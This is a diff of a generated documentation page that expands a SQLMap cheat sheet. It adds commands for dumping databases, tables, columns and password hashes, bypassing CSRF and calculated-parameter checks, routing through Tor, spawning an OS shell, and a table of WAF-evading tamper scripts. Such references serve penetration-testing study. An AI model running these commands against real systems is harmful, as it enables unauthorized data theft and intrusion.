@@ -16,7 +16,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
     
     
       
@@ -24,7 +24,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
@@ -615,6 +615,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Flags
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-sqlmap-tamper-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common SQLMap Tamper Scripts
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1175,6 +1202,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Flags
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-sqlmap-tamper-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common SQLMap Tamper Scripts
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1253,7 +1307,6 @@
 </table>
 <h2 id="commands">Commands</h2>
 <p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLMap wiki</a></p>
-<p><strong>Note:</strong> When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).</p>
 <p><strong>Note:</strong> SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*").</p>
 <table>
 <thead>
@@ -1320,20 +1373,36 @@
 <td>Specifying a prefix or suffix</td>
 </tr>
 <tr>
-<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td>
-<td>Specifying the level and risk</td>
+<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3</code></td>
+<td>Specifying the level (boundaries used) and risk (vectors used)</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs</code></td>
+<td>Dump all databases excluding system databases</td>
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></td>
-<td>Basic DB enumeration</td>
+<td>Basic DB enumeration (version, current user/database name, if the current user has admin rights)</td>
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></td>
-<td>Table enumeration</td>
+<td>Table enumeration, specifying database name</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -D testdb</code></td>
+<td>Dump all tables</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</code></td>
+<td>Dump whole table, specifying table and database name</td>
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</code></td>
-<td>Table/row enumeration</td>
+<td>Only dump specified columns</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3</code></td>
+<td>Only dump specified rows</td>
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></td>
@@ -1345,7 +1414,15 @@
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
-<td>Searching for data</td>
+<td>Searching for all tables containing user</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --search -C pass</code></td>
+<td>Searching for all columns containing pass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
+<td>Searching for all tables containing user</td>
 </tr>
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</code></td>
@@ -1354,6 +1431,14 @@
 <tr>
 <td><code>sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></td>
 <td>Anti-CSRF token bypass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1&amp;rp=29125" --randomize=rp</code></td>
+<td>Unique value bypass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"</code></td>
+<td>Calculated parameter bypass</td>
 </tr>
 <tr>
 <td><code>sqlmap --list-tampers</code></td>
@@ -1374,6 +1459,197 @@
 <tr>
 <td><code>sqlmap -u "http://www.example.com/?id=1" --os-shell</code></td>
 <td>Spawning an OS shell</td>
+</tr>
+</tbody>
+</table>
+<h2 id="tips">Tips</h2>
+<ul>
+<li>Increase risk when testing login forms to use OR payloads</li>
+<li>The '--all' switch in combination with the '--batch' switch, will automaically do the whole enumeration process on the target itself, and provide the entire enumeration details. </li>
+</ul>
+<h2 id="additional-flags">Additional Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--crawl</code>, <code>--forms</code> or <code>-g</code></td>
+<td>Used for automatic parameter finding</td>
+</tr>
+<tr>
+<td><code>--parse-errors</code></td>
+<td>Display errors</td>
+</tr>
+<tr>
+<td><code>--proxy</code></td>
+<td>Send requests through a proxy like burp</td>
+</tr>
+<tr>
+<td><code>--proxy-file</code></td>
+<td>work sequentially through a list of proxies</td>
+</tr>
+<tr>
+<td><code>--tor</code></td>
+<td>Use tor as a proxy, needs tor running locally</td>
+</tr>
+<tr>
+<td><code>--check-tor</code></td>
+<td>Check tor proxy configured correctly</td>
+</tr>
+<tr>
+<td><code>--code=200</code></td>
+<td>Test for specific HTTP response code</td>
+</tr>
+<tr>
+<td><code>--titles</code></td>
+<td>Base comparison on the content of the <code>&lt;title&gt;</code> tag</td>
+</tr>
+<tr>
+<td><code>--string=success</code></td>
+<td>Check for specific string value in response</td>
+</tr>
+<tr>
+<td><code>--not-string=error</code></td>
+<td>Check for the lack of specified string in response</td>
+</tr>
+<tr>
+<td><code>--text-only</code></td>
+<td>Removes all HTML tags from response, basing comparison on only textual content</td>
+</tr>
+<tr>
+<td><code>--technique=BEU</code></td>
+<td>Specify techniques used (default BEUSTQ)</td>
+</tr>
+<tr>
+<td><code>--union-cols=17</code></td>
+<td>Specify the number of columns used in union queries (if known)</td>
+</tr>
+<tr>
+<td><code>--union-char='a'</code></td>
+<td>Specify dummy values for union queries</td>
+</tr>
+<tr>
+<td><code>--union-from=users</code></td>
+<td>Specify the FROM appendix for union queries</td>
+</tr>
+<tr>
+<td><code>--no-cast</code></td>
+<td>Don't use casting (CAST(value AS CHAR))</td>
+</tr>
+<tr>
+<td><code>--hex</code></td>
+<td>Hex encode database response</td>
+</tr>
+<tr>
+<td><code>--dump-format</code></td>
+<td>Specify format to dump table in, e.g. HTML or SQLite</td>
+</tr>
+<tr>
+<td><code>--skip-waf</code></td>
+<td>Skip WAF check test</td>
+</tr>
+<tr>
+<td><code>--chunked</code></td>
+<td>Request body into chunks, blacklisted SQL keywords are split between chunks</td>
+</tr>
+<tr>
+<td><code>--hpp</code></td>
+<td>Payloads are split between different same parameter named values which are concatenated by the target platform if supporting it (e.g. ASP)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-sqlmap-tamper-scripts">Common SQLMap Tamper Scripts</h2>
+<table>
+<thead>
+<tr>
+<th>Tamper-Script</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0eunion</td>
+<td>Replaces UNION with e0UNION</td>
+</tr>
+<tr>
+<td>base64encode</td>
+<td>Base64-encodes all payload characters</td>
+</tr>
+<tr>
+<td>between</td>
+<td>Replaces &gt; with NOT BETWEEN 0 AND #; = with BETWEEN # AND #</td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td>Replaces MySQL LIMIT M, N with LIMIT N OFFSET M</td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td>Replaces = with LIKE</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords</td>
+<td>Adds MySQL versioned comment before keywords</td>
+</tr>
+<tr>
+<td>modsecurityversioned</td>
+<td>Wraps query with MySQL versioned comment</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned</td>
+<td>Wraps query with MySQL zero-versioned comment</td>
+</tr>
+<tr>
+<td>percentage</td>
+<td>Adds % before each character (e.g., SELECT -&gt; %S%E%L%E%C%T)</td>
+</tr>
+<tr>
+<td>plus2concat</td>
+<td>Replaces + with MsSQL CONCAT() function</td>
+</tr>
+<tr>
+<td>randomcase</td>
+<td>Randomizes case of keyword characters (e.g., SELECT -&gt; SEleCt)</td>
+</tr>
+<tr>
+<td>space2comment</td>
+<td>Replaces space with comment <code>/*</code></td>
+</tr>
+<tr>
+<td>space2dash</td>
+<td>Replaces space with dash comment (--)</td>
+</tr>
+<tr>
+<td>space2hash</td>
+<td>Replaces space with MySQL # comment</td>
+</tr>
+<tr>
+<td>space2mssqlblank</td>
+<td>Replaces space with MsSQL blank character</td>
+</tr>
+<tr>
+<td>space2plus</td>
+<td>Replaces space with plus (+)</td>
+</tr>
+<tr>
+<td>space2randomblank</td>
+<td>Replaces space with random blank character</td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>Replaces AND/OR with &amp;&amp;/</td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td>Wraps non-function keywords with MySQL comment</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td>Wraps all keywords with MySQL comment</td>
 </tr>
 </tbody>
 </table>
@@ -1425,10 +1701,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      <script src="../../assets/javascripts/bundle.50899def.min.js"></script>
       
     
   </body>
